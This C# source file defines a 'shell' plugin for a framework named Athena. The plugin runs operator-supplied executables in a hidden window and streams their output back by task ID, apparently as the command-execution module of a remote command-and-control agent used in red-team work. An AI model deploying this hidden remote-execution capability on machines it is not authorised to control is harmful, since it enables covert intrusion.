using Athena.Plugins;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace Plugins
{
    public class Shell : AthenaPlugin
    {
        public override string Name => "shell";
        Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
        public override void Execute(Dictionary<string, string> args)
        {
            Console.WriteLine("in shell execute.");
            try
            {
                PluginHandler.AddResponse(ShellExec(args));
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                //oh no an error
                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
        public void Kill(Dictionary<string, string> args)
        {
            try
            {
                if (runningProcs.ContainsKey(args["task-id"]))
                {
                    runningProcs[args["task-id"]].Kill();
                    runningProcs[args["task-id"]].WaitForExit();

                    PluginHandler.AddResponse(new ResponseResult()
                    {
                        task_id = args["task-id"],
                        user_output = "Job Cancelled.",
                        completed = "true",
                    });
                }
            }
            catch (Exception e)
            {

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = args["task-id"],
                    user_output = e.ToString(),
                    completed = "true",
                    status = "error",
                });
            }
        }
        public ResponseResult ShellExec(Dictionary<string, string> args)
        {
            string parameters = "";
            if (!String.IsNullOrEmpty(args["arguments"]))
            {
                parameters = args["arguments"];
            }

            string executable = args["executable"];

            Process process = new Process
            {
                StartInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = executable,
                    Arguments = parameters,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            try
            {
                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) PluginHandler.Write(errorLine.Data + Environment.NewLine, args["task-id"], false, "error"); };
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) PluginHandler.Write(outputLine.Data + Environment.NewLine, args["task-id"], false); };

                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();

                process.WaitForExit();
                ResponseResult result = new ResponseResult()
                {
                    user_output = Environment.NewLine + "Process Finished.",
                    task_id = args["task-id"],
                    completed = "true",
                };

                if (process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                }
                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                    user_output = Environment.NewLine + e.ToString(),
                    task_id = args["task-id"],
                    completed = "true",
                    status = "error"
                };
            }
        }
    }
}
